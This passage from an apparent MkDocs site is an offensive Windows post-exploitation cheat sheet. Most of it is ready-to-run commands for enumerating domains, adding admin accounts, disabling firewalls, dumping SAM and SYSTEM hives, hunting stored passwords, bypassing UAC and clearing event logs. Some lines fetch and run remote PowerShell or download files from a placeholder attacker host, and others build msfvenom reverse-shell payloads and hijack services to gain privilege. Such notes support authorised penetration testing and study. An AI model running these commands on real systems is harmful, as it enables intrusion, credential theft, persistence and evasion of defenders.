<span class="k">ftype</span> powershellfile=<span class="s2">&quot;</span><span class="nv">%SystemRoot%</span><span class="s2">\system32\WindowsPowerShell\v1.0\powershell.exe&quot;</span>
    -to set a default program for opening a given filetype associate an extension with a defined filetype value(which multiple extensions my be associated with), then set the default program to execute files of a given type with
<span class="k">dir</span> /a-r-d /s /b
    -check directory for writeable files
powershell Get-ChildItem -Recurse <span class="p">|</span> Get-Acl <span class="p">|</span> out-string -stream <span class="p">|</span> select-string -pattern <span class="s2">&quot;everyone&quot;</span>
    -check for world-writeable files

File Transfer  
iexplore.exe http://blah.com/filename.zip
C<span class="p">:</span><span class="nl">\windows\explorer.exe</span><span class="c1"> http://somewhere.com/filename.ext</span>
ftp ftp.site.dom


USERS
whoami
net users
net user /domain
    -list users in current domain
net user username
    -list user info
net user name pass /add
    -add local system user
net user user_name * /domain
    -add user to domain with interactive prompt for password
net user name setpword
net user /DOMAIN <span class="nv">%USERNAME%</span>
    -check user&#39;s network group membership
net user /domain user
    -check another user&#39;s information
net group <span class="s2">&quot;Domain Users&quot;</span> /domain
    -list users in AD group
net localgroup <span class="s2">&quot;administrators&quot;</span> /domain
    -list domain local group users
net group “Domain Admins” /domain
net group “Enterprise Admins” /domain
net group “Domain Controllers” /domain
NET LOCALGROUP <span class="s2">&quot;Remote Desktop Users&quot;</span> trinity /ADD
net accounts
    -prints password policy for locahost
net accounts /domain
dsmod user /?
    -get dsmod commands cruft
dsmod user administrator -pwd NewPassword -mustchpwd yes
    -modify user password, set pwExpired flag


NETWORK
arp -A
net view
    -view available network share hosts
net view \\HOST
    -view available shares on host
net view /domain:otherdomain
    Queries NBNS/SMB (SAMBA) and tries to find all hosts in ‘otherdomain’
tasklist /V /S computername
qwinsta /SERVER:computername
qprocess /SERVER:computername *
net use \\computername This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed
<span class="k">dir</span> \\computername\share_or_admin_share\
net use \\computer\share
    -mount an smb share
net use X: \\10.2.2.224\C$
net use * http//hostname/nfs/ pword /USER:username
net share name=c:\path\to\share
    -create smb share
net share name=c:\path\to\share /GRANT:Everyone,FULL
    -make an smb share world-accessable
<span class="k">pushd</span> \\10.2.2.224\C$
    -mount remote file share to automatically mapped drive
cacls c:\path\ /T /E /G user:f
    -grant user full file access control from path
tasklist /V /S computername
    Lists tasks w/users running those tasks on a remote system
netsh firewall show state
netsh firewall show config
netsh firewall set opmode disable
netsh advfirewall firewall set rule group=<span class="s2">&quot;windows management instrumentation (wmi)&quot;</span> new enable=yes
    -enable remote wmi
netsh interface ip set address local dhcp
    -configure nic to user dhcp
netsh advfirewall firewall add rule name=<span class="s2">&quot;Open Port 3389&quot;</span> dir=in action=allow protocol=TCP localport=3389
    -open port (for rdesktop)
netsh advfirewall firewall add rule name=<span class="s2">&quot;Block mssql attack ips&quot;</span> dir=in action=block protocol=TCP localport=1433 remoteip=22.75.175.213
    -close port (for rdesktop)
netsh advfirewall set allprofiles state off
netsh wlan show profiles
    -shows all saved wireless profiles
netsh wlan export profile folder=. key=clear
    exports a user wifi profile with the password in plaintext to an xml file in the current working directory
netsh wlan [start<span class="p">|</span>stop] hostednetwork
    Starts or stops a wireless backdoor on a windows 7 pc
netsh wlan set hostednetwork ssid=<span class="p">&lt;</span>ssid<span class="p">&gt;</span> key=<span class="p">&lt;</span>passphrase<span class="p">&gt;</span> keyUsage=persistent<span class="p">|</span>temporary
    Complete hosted network setup for creating a wireless backdoor on win 7
netsh wlan set hostednetwork mode=[allow<span class="p">|</span>disallow]
netdom query trust /Domain:dnsname
    OR
nltest /domain_trusts /All_Trusts



SERVICES/PROCESSES/PERMISSIONS <span class="p">&amp;&amp;</span> configuration
tasklist
tasklist /SVC
taskkill <span class="p">&lt;</span>pid&gt;
net start
    -list all running services
sc [stop<span class="p">|</span><span class="k">start</span>] service
sc qc service
    -view configuration of a service
    -<span class="p">&gt;</span>sc config upnphost binpath= <span class="s2">&quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</span>
    -<span class="p">&gt;</span>sc config upnphost obj= <span class="s2">&quot;.\LocalSystem&quot;</span> password= <span class="s2">&quot;&quot;</span>
    -<span class="p">&gt;</span>net start upnphost
sc query
sc queryex
schtasks /query /fo LIST /v
net start RpcSs
net stop RpcSs
    -start stop rpc service on localhost
c<span class="p">:</span><span class="nl">\windows\system32\gathernetworkinfo.vbs</span>
    <span class="p">(</span>Windows 7<span class="p">)</span>Included script with, enumerates builtin config information
pkgmgr /iu:<span class="s2">&quot;TelnetServer&quot;</span>
pkgmgr /iu:IIS-WebServerRole;WAS-WindowsActivationService;WAS-WindowsProcessModel; WAS-NetFxEnvironment;WAS-ConfigurationAPI
pkgmgr /uu:WAS-WindowsActivationService;WAS-WindowsProcessModel
    <span class="p">(</span>On Vista<span class="p">)</span> install update or uninstall update builtin process
icacls <span class="s2">&quot;dir\&quot;</span>
    -check the file permissions of a folder

WMIC
    WINDOWS MANAGEMENT INSTRUMENTATION
**default xp configuration does not allow low priv(non-members of administrators group) to wmic; w7/8 by default allow access to low priv users
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
https://blogs.technet.microsoft.com/heyscriptingguy/2014/09/13/weekend-scripter-the-wmi-explorer-tool/
    QUERIES
SELECT [Class property name<span class="p">|</span>*] FROM [CLASS NAME] <span class="p">&lt;</span>WHERE [CONSTRAINT]&gt;
SELECT * FROM Win32_Process WHERE Name LIKE “<span class="nv">%chrome%</span>”
    -wmic instance query
    INFORMATION
wmic /?
    WMIC enable (remote)
wmic startupwmic service
    -start remote wmi service
netsh firewall set service RemoteAdmin enable
netsh advfirewall firewall set rule group=<span class="s2">&quot;windows management instrumentation (wmi)&quot;</span> new enable=yes
    -make exception in firewall for remote wmic service
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM\CIMOM\AllowAnonymousCallback
Get-WmiObject -Namespace <span class="s2">&quot;root\cimv2&quot;</span> -Class Win32_LogicalDisk -ComputerName <span class="p">&lt;</span>REMOTE_IP<span class="p">&gt;</span> -Credential <span class="p">&lt;</span>DOMAIN\User&gt;
    -test remote wmi access
    ENUMERATION
wmic qfe
    -patch level information
wmic qfe get
    -list patching information for localhost
wmic qfe qfe hotfixid
wmic qfe get Caption,Description,HotFixID,InstalledOn\
    -get windows patch level information
wmic process list full
    -list all attributes of all running processes
wmic process get caption,executablepath,commandline
wmic process call create “program”
wmic process where name=“program” call terminate
    -kill target program
wmic process get caption,executablepath,commandline /format:csv
wmic useraccount
wmic useraccount get /ALL
wmic useraccount where name=&#39;uname&#39; get sid
wmic useraccount where sid=&#39;S-1-3-12-1234525106-3567804255-30012867-1437&#39; get name
wmic useraccount where (name=&#39;administrator&#39; and domain=&#39;<span class="nv">%computername%</span>&#39;) get name,sid
    -get name/sid for system admin
wmic useraccount where (name=&#39;administrator&#39; and domain=&#39;<span class="nv">%userdomain%</span>&#39;) get name,sid
    -get name/sid for domain admin
wmic service get name,displayname,pathname,startmode <span class="p">|</span>findstr /i <span class="s2">&quot;Auto&quot;</span> <span class="p">|</span>findstr /i /v <span class="s2">&quot;C:\Windows\\&quot;</span> <span class="p">|</span>findstr /i /v <span class="s2">&quot;&quot;&quot;</span>
    -check for trusted service paths(privesc)
wmic get /ALL /format:csv
wmic share get /ALL
    -list smb shares
wmic logicaldisk get name
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
wmic start list full
    -list startup programs
wmic computersystem get domain
wmic ntdomain list
    -domain and DC info
PRIVESC enumeration
wmic service get name,displayname,pathname,startmode <span class="p">|</span>findstr /i <span class="s2">&quot;Auto&quot;</span> <span class="p">|</span>findstr /i /v <span class="s2">&quot;C:\Windows\\&quot;</span> <span class="p">|</span>findstr /i /v <span class="s2">&quot;&quot;&quot;</span>
    -find unquote service path



REGISTRY
*note HKLM keys are for HKey local machine registry
*HKCU keys are for HKey current user registry entries
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    -together allow users of any privilege level to install *.msi files as NT AUTHORITY\SYSTEM
reg add <span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f
    -enable RDP
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
    -grep the registry for key word <span class="s2">&quot;password&quot;</span>
REG add <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\services\RpcSs&quot;</span> /v Start /t REG_DWORD /d 2 /f
    -change startup type for rpc service to automatic
REG add <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\services\RpcSs&quot;</span> /v Start /t REG_DWORD /d 4 /f
    -change startup type for rpc service to disabled
reg add
<span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\Current ControlSet\Control\Terminal Server&quot;</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f
reg query HKLM /s /d /f <span class="s2">&quot;C:\* *.exe&quot;</span> <span class="p">|</span> find /I <span class="s2">&quot;C:\&quot;</span> <span class="p">|</span> find /V <span class="s2">&quot;&quot;&quot;&quot;</span>
    -(win7) curely registered executables within the system registry
reg query <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span>
    -windows autologin
reg query <span class="s2">&quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span>
    -vnc stored password
reg query<span class="s2">&quot; HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span>
    -putty cleartext credentials
reg save HKLM\Security security.hive    --save security.hive
reg save HKLM\System system.hive    --save system hive to file
reg save HKLM\SAM sam.hive  --save sam to file
reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d <span class="s2">&quot;cmd.exe&quot;</span> /f <span class="p">&amp;&amp;</span> <span class="k">START</span> /W CompMgmtLauncher.exe <span class="p">&amp;&amp;</span> reg delete HKEY_CURRENT_USER\Software\Classes\mscfile /f
    -UAC bypass for win 7/8/10
reg add <span class="s2">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot;</span> /d <span class="s2">&quot;cmd.exe&quot;</span> /f <span class="p">&amp;&amp;</span> <span class="k">START</span> /W sdclt.exe <span class="p">&amp;&amp;</span> reg delete <span class="s2">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot;</span> /f
    -UAC bypass for win 10

<span class="k">START</span><span class="p">&gt;</span>Administrative Tools<span class="p">&gt;</span>Server Manager<span class="p">&gt;</span>Features<span class="p">&gt;</span>Add Features<span class="p">&gt;</span>Administrative Tools<span class="p">&gt;</span>Windows Powershell
    -enable powershell on machine
POWERSHELL
syntax (from cmd.exe, where installed):
    Special Characters
<span class="s2">&quot; The beginning (or end) of quoted text</span>
# The beginning of a comment
$ The beginning of a variable
<span class="p">&amp;</span> Reserved for future use
<span class="p">(</span> <span class="p">)</span> Parentheses used for subexpressions
; Statement separator
{ } Script block
<span class="p">|</span> Pipeline separator
` Escape character
    .\Powershell.exe -command <span class="p">&lt;</span>command<span class="p">&gt;</span> &lt;parameter(s)&gt;
    attrib +R c:\path\to\file.txt
    $var = <span class="s2">&quot;hello&quot;</span>
    Powershell.exe -command Get-HotFix
        -check Windows patch level
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1&#39;);Get-NetUser
        -display all AD users
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1&#39;);Get-UserProperties -Properties name,memberof,description,info
        -return AD user proprietary information
    set-ItemProperty -Path &#39;HKLM:\System\Current\ControlSet\Control\Terminal Server&#39;-name <span class="s2">&quot;fDenyTSConnections&quot;</span> -Value 0
        -format for making registry queries from powershell
        --enable RDP on target hostname
    Enable-NetFirewallRule -DisplayGroup <span class="s2">&quot;Remote Desktop&quot;</span>
        -enable existing firewall rule, e.g. RDP allow
    powershell.exe -command New-NetFirewallRule -DisplayName <span class="s2">&quot;Allow Inbound Port 80&quot;</span> -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
        -create new firewall rule set to allow
        --to create a block rule set -Action Block
    powershell.exe -command Get-Service
        -show all services
    powershell.exe -command Restart-Service
        -restart target service
    powershell.exe -command Get-Service Set-DNSClientServerAddress - InterfaceAlias <span class="s2">&quot;Ethernet&quot;</span> -ServerAddresses 8.8.8.8
        -Configure the DNS Server (to 8.8.8.8/Google)
    powershell.exe -command Get-Process
        -return a process listing
    Start-Job { &#39;C:\bin\hashcat\bin\hashcat64.exe&#39; } -Name cracker
    bitsadmin /transfer jobname /download /priority normal http://hack.er/file.ext C:\Path\to\outfile.ext
        -download a file
        ACTIVE DIRECTORY cmdlets
    Get-Job -State
    Stop-Job cracker
    Get-Command *text*
    Get-Command -Verb Get
    Get-Command -Noun Service
    Get-Help Get-Command (-Detailed,-Full,-Examples,-Online)
        OR
    Get-Command -?
    Get-SmbServerConfiguration
    Set-SmbServerConfiguration -EnableSMB1Protocol $true
    Get-ChildItem -Path C:\path -Filter namedpipe.exe -Recurse -ErrorAction SilentlyContinue -Force
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1&#39;);Get-NetComputers
        -return listing of hosts in Active Directory
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1&#39;);Get-Information
        -return information collected on sys,reg,<span class="p">&amp;</span>c
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1&#39;);Invoke-Userhunter
        -search network for hosts in use by Domain Admin(s)
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1&#39;);Invoke-Userhunter -UserName <span class="s2">&quot;admin&quot;</span>
        -search network for host user <span class="s2">&quot;admin&quot;</span> is on
    get-aduser -filter {name -like <span class="s2">&quot;krbtgt*&quot;</span>} -prop Name,Created,PasswordLastSet,msDS-KeyVersionNumber,msDS-KrbTgtLinkB1
        -get information for krbtgt active directory domain account
    Get-ADForest <span class="p">|</span> Select Domains
        -enum domains in an AD forest
    Get-ADDomain <span class="p">|</span> FL NetBIOSName
        -get netbios name of an AD domain
    Get-ADTrust -filter *

Powershell x WMIC
    wmic.exe
Powershell WMI cmdlets
-- Get-WmiObject
-- Get-CimAssociatedInstance
-- Get-CimClass
-- Get-CimInstance
-- Get-CimSession
-- Set-WmiInstance
-- Set-CimInstance
-- Invoke-WmiMethod
-- Invoke-CimMethod
-- New-CimInstance
-- New-CimSession
-- New-CimSessionOption
-- Register-CimIndicationEvent
-- Register-WmiEvent
-- Remove-CimInstance
-- Remove-WmiObject
-- Remove-CimSession
Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential ‘WIN-B85AAA7ST4U\Administrator&#39;
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
    -av detection
SELECT * FROM Win32_ComputerSystem WHERE TotalPhysicalMemory <span class="p">&lt;</span> 2147483648
SELECT * FROM Win32_ComputerSystem WHERE NumberOfLogicalProcessors <span class="p">&lt;</span> 2
SELECT * FROM Win32_NetworkAdapter WHERE Manufacturer LIKE “<span class="nv">%VMware%</span>”
SELECT * FROM Win32_BIOS WHERE SerialNumber LIKE “<span class="nv">%VMware%</span>”
SELECT * FROM Win32_Process WHERE Name=”vmtoolsd.exe”
SELECT * FROM Win32_NetworkAdapter WHERE Name LIKE “<span class="nv">%VMware%</span>”
    -vm detection
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ‘notepad.exe’
    -code execution, like psexec but stealthier

SYSINTERNALS
PSEXEC
psexec /?
psexec -accepteula
psexec \\machinename reg add <span class="s2">&quot;hklm\system\currentcontrolset\control\terminal server&quot;</span> /f /v fDenyTSConnections /t REG_DWORD /d 0
psexec \\10.2.2.23 netsh firewall set service remoteadmin enable
psexec \\JAMES -u james -p FmyN3rZ37LNss2X netsh firewall set service remoteadmin enable

CLEANUP
wevtutil el
    -list logs
wevtutil cl log.log
    -clear specific lowbadming
<span class="k">del</span> <span class="nv">%WINFRT%</span>\*.log /a /s /q /f

ADVANCED
DRIVERQUERY

LOCAL EXPLOITS
KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
-patch levels corresponding to most common windows privesc exploits for xp/vista/7/server2003-2008
KB2503665:
    patch level for afd.sys(40564) local exploit (xp sp3, server 2003 sp2, vista sp1/2, server 2008 sp1/2, 7 (sp0/1)
    Table of patch replacements:
#                               <span class="p">|</span> MS11-046  <span class="p">|</span> MS11-080  <span class="p">|</span> MS12-009  <span class="p">|</span> MS13-093  <span class="p">|</span> MS14-040  <span class="p">|</span>
#                               -------------------------------------------------------------
#                               <span class="p">|</span> KB2503665 <span class="p">|</span> KB2592799 <span class="p">|</span> KB2645640 <span class="p">|</span> KB2875783 <span class="p">|</span> KB2975684 <span class="p">|</span>
#   -----------------------------------------------------------------------------------------
#   Windows x86 XP SP3          <span class="p">|</span> Installed <span class="p">|</span> <span class="p">&lt;</span>-Replaces<span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>
#   Windows x86 Server 2003 SP2 <span class="p">|</span> Installed <span class="p">|</span> <span class="p">&lt;</span>-Replaces<span class="p">|</span> <span class="p">&lt;</span>-Replaces<span class="p">|</span>     -     <span class="p">|</span> <span class="p">&lt;</span>-Replaces<span class="p">|</span>
#   Windows x86 Vista SP1       <span class="p">|</span> Installed <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>
#   Windows x86 Vista SP2       <span class="p">|</span> Installed <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span> <span class="p">&lt;</span>-Replaces<span class="p">|</span>
#   Windows x86 Server 2008     <span class="p">|</span> Installed <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>
#   Windows x86 Server 2008 SP2 <span class="p">|</span> Installed <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span> <span class="p">&lt;</span>-Replaces<span class="p">|</span>
#   Windows x86 7               <span class="p">|</span> Installed <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>
#   Windows x86 7 SP1           <span class="p">|</span> Installed <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span>     -     <span class="p">|</span> <span class="p">&lt;</span>-Replaces<span class="p">|</span>


Policy files (may contain passwords)
SYSVOL/(../)Groups.xml
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes


Configuration files commonly left behind by mass rollouts/older (pre-)devops
c<span class="p">:</span><span class="nl">\sysprep.inf</span>
c<span class="p">:</span><span class="nl">\sysprep\sysprep.xml</span>
<span class="nv">%WINDIR%</span>\Panther\Unattend\Unattended.xml
<span class="nv">%WINDIR%</span>\Panther\Unattended.xml

Trusted Service Paths
    exploit/windows/local/trusted_service_path
wmic service get name,displayname,pathname,startmode <span class="p">|</span>findstr /i <span class="s2">&quot;Auto&quot;</span> <span class="p">|</span>findstr /i /v <span class="s2">&quot;C:\Windows\\&quot;</span> <span class="p">|</span>findstr /i /v <span class="s2">&quot;&quot;&quot;</span>
icacls <span class="s2">&quot;C:\Program Files (x86)\Target&quot;</span>
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe
    -now replace Target\target.exe with payload
sc stop target
sc start target
    -now the reverse shell should be spawned as privileged user

Vulnerable Services
    exploit/windows/local/service_permissions
accesschk.exe -uwcqv <span class="s2">&quot;Authenticated Users&quot;</span> * /accepteula
sc qc target
sc config target binpath= <span class="s2">&quot;net user hacker P@ssword123! /add&quot;</span>
sc stop target
sc start target
sc config target binpath= <span class="s2">&quot;net localgroup Administrators hacker /add&quot;</span>
sc stop target
sc start target
    -errors may occur starting service, but only after commands are executed

AlwaysInstallElevated
    exploit/windows/local/always_install_elevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o exploit.msi
msiexec /quiet /qn /i C:\Users\User\Downloads\exploit.msi

DLL Injection
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe






WIN filesystem read targets

tier 1
<span class="nv">%SYSTEMDRIVE%</span>\boot.ini
    near ubiquitous, confirmation that a read is happening
<span class="nv">%WINDIR%</span>\win.ini
    second test file if boot.ini cannot be found/returned
<span class="nv">%SYSTEMROOT%</span>\repair\SAM
<span class="nv">%SYSTEMROOT%</span>\System32\config\RegBack\SAM
    stores users&#39; passwords in a hashed format (in LM hash and NTLM hash). The SAM file in \repair is locked, but can be retired using forensic or Volume Shadow copy methods
<span class="nv">%SYSTEMROOT%</span>\repair\system
<span class="nv">%SYSTEMROOT%</span>\System32\config\RegBack\system
    key to read SAM hashes in plaintext without cracking
<span class="nv">%WINDIR%</span>\repair\security
<span class="nv">%SYSTEMDRIVE%</span>\autoexec.bat

TIER 1, LOCATION NOT SET BY DEFAULT
unattend.txt
unattend.xml
sysprep.inf
    --(ALL)Used in the automated deployment of windows images and can contain user accounts. No known default location.

tier 2
<span class="nv">%WINDIR%</span>\debug\NetSetup.log
<span class="nv">%WINDIR%</span>\repair\software
<span class="nv">%WINDIR%</span>\iis6.log
    <span class="p">(</span>or 5 or 7, given version<span class="p">)</span>
<span class="nv">%WINDIR%</span>\system32\logfiles\httperr\httperr1.log
    --iis6 error log
<span class="nv">%SystemDrive%</span>\inetpub\logs\LogFiles
    --IIS 7’s logs location
<span class="nv">%WINDIR%</span>\system32\config\AppEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\SecEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\default.sav
<span class="nv">%WINDIR%</span>\system32\config\security.sav
<span class="nv">%WINDIR%</span>\system32\config\software.sav
<span class="nv">%WINDIR%</span>\system32\config\system.sav
<span class="nv">%WINDIR%</span>\system32\CCM\logs\*.log
<span class="nv">%USERPROFILE%</span>\ntuser.dat
<span class="nv">%USERPROFILE%</span>\LocalS~1\Tempor~1\Content.IE5\index.dat
<span class="nv">%WINDIR%</span>\System32\drivers\etc\hosts



references
http://www.fuzzysecurity.com/tutorials/16.html
https://www.toshellandback.com/2015/11/24/ms-priv-esc/


https://pastebin.com/FehvXsEZ
https://pastebin.com/HvKs18zh
</pre></div>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../windows-privilege-escalation/" title="Windows Privilege Escalation" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Windows Privilege Escalation
              </span>
            </div>
          </a>
        
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
    
  </body>
</html>